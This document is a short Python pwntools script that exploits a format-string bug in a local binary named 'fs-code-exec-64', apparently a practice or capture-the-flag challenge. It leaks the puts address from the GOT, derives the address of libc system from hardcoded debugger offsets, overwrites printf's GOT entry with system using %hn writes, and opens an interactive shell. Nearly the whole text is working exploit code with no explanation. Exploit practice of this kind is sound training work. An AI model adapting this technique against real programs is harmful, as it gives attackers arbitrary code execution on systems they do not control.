#!/usr/bin/env python
from pwn import *

p = process('./fs-code-exec-64')
#context.terminal = ['tmux','splitw','-h']
#gdb.attach(p)

got_of_puts = p.elf.got['puts']
#print(hex(got_of_puts))

target = p.elf.got['printf']
t2 = target + 2
#print(hex(target)) 0x601030

print(p.recv())

#buf = "%7$s" + "BBBB" + p64(got_of_puts)
#print(buf)
p.sendline("%7$s" + "BBBB" + p64(got_of_puts))

data = p.recv()
print(repr(data))
#libc_puts = u64(data[6:12])
libc_puts = unpack(data[6:12], 'all', endian='little', sign=True)
print(hex(libc_puts))

"""
pwndbg> p puts
$1 = {<text variable, no debug info>} 0x7f265b3f7690 <_IO_puts>
pwndbg> p system
$2 = {<text variable, no debug info>} 0x7f265b3cd390 <__libc_system>
pwndbg> p printf
$3 = {<text variable, no debug info>} 0x7f265b3dd800 <__printf>
"""

#0x7fd0156eb390
libc_sys = libc_puts - 0x7f265b3f7690 + 0x7f265b3cd390
print(hex(libc_sys))

#0xb390
lower_sys = libc_sys & 0xffff
first = lower_sys
print(hex(lower_sys))

#0x156e
upper_sys = (int(libc_sys & 0xffff0000) >> 16)
#print(hex(int(libc_sys & 0xffff0000)>>16))
#second = (libc_sys >> 16)
print(hex(upper_sys))
second = upper_sys - lower_sys
#print(hex((libc_sys >> 32) & 0xffff))
#print(hex(libc_sys - (libc_sys >> 16)))

while second < 0:
    second += 0x10000

#lowertarget: 0xd800 -> 0xd390
#t2: 0x5b3d -> 0x5b3c

buf = "%" + "%05d" % first + "x"
#buf += "%20$hn"
buf += "%10$hn"
buf += "%" + "%05d" % second + "x"
#buf += "%21$hn"
buf += "%11$hn"
buf += "AAAAAA"
buf += p64(target) + p64(t2)
print(buf)

p.sendline(buf)
p.interactive()

